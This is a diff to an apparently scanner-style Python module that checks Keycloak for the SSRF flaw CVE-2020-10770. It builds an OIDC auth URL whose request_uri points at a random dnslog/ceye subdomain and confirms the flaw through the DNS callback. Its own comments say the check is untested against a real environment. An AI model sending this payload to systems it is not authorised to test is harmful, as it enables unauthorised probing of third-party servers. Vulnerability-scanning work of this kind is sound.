@@ -1,21 +1,22 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-'''
-还！！！没！！！写！！！好！！！ 还没加dnslog
-网上没有漏洞环境, 还没测试POC准确性
+''' 该POC没有经过实际环境验证(暂未找到漏洞环境, 还没测试POC准确性)
+
     Keycloak扫描类: 
         Keycloak SSRF
             CVE-2020-10770
-            强制目标服务器使用OIDC参数请求request_uri调用未经验证的URL
+                Payload: Awvs scanner
 '''
 
+from lib.api.dns import dns
 from lib.initial.config import config
-from lib.tool.md5 import md5
+from lib.tool.md5 import md5, random_md5
 from lib.tool.logger import logger
 from lib.tool.thread import thread
 from lib.tool import check
 from thirdparty import requests
+from time import sleep
 
 class Keycloak():
     def __init__(self):
@@ -28,12 +29,14 @@ class Keycloak():
 
         self.cve_2020_10770_payloads = [
             {
-                'path': 'auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://127.0.0.1',
+                'path': 'auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=dnsdomain',
                 'data': ''
             }
         ]
 
     def cve_2020_10770_scan(self, url):
+        ''' 强制目标服务器使用OIDC参数请求request_uri调用未经验证的URL '''
+        sessid = '4a397cf8261c330c8e8c8f584b1b647a'
         vul_info = {}
         vul_info['app_name'] = self.app_name
         vul_info['vul_type'] = 'SSRF'
@@ -41,28 +44,31 @@ class Keycloak():
         vul_info['vul_method'] = 'GET'
         vul_info['headers'] = {}
 
-        headers = self.headers
-        headers.update(vul_info['headers'])
+        # headers = self.headers
+        # headers.update(vul_info['headers'])
 
-        for payload in self.cve_2020_10770_payloads:    # * Payload
-            path = payload['path']                      # * Path
-            data = payload['data']                      # * Data
-            target = url + path                         # * Target
+        for payload in self.cve_2020_10770_payloads:                # * Payload
+            md = random_md5()                                       # * 随机md5值, 8位
+            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
+
+            path = payload['path'].replace('dnsdomain', dns_domain) # * Path
+            data = payload['data']                                  # * Data
+            target = url + path                                     # * Target
 
             vul_info['path'] = path
             vul_info['data'] = data
             vul_info['target'] = target
 
             try:
-                res = requests.post(
+                res = requests.get(
                     target, 
                     timeout=self.timeout, 
-                    headers=headers, 
+                    headers=self.headers, 
                     data=data,
                     proxies=self.proxies, 
                     verify=False
                 )
-                logger.logging(vul_info, res.status_code, vars(res.request))                        # * LOG
+                logger.logging(vul_info, res.status_code, res)                        # * LOG
             except requests.ConnectTimeout:
                 logger.logging(vul_info, 'Timeout')
                 return None
@@ -73,7 +79,8 @@ class Keycloak():
                 logger.logging(vul_info, 'Error')
                 return None            
 
-            if res.status_code == 400:
+            sleep(2)                                                # * dns查询可能较慢, 等一会
+            if ((res.status_code == 400) and (md in dns.result(md, sessid))):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
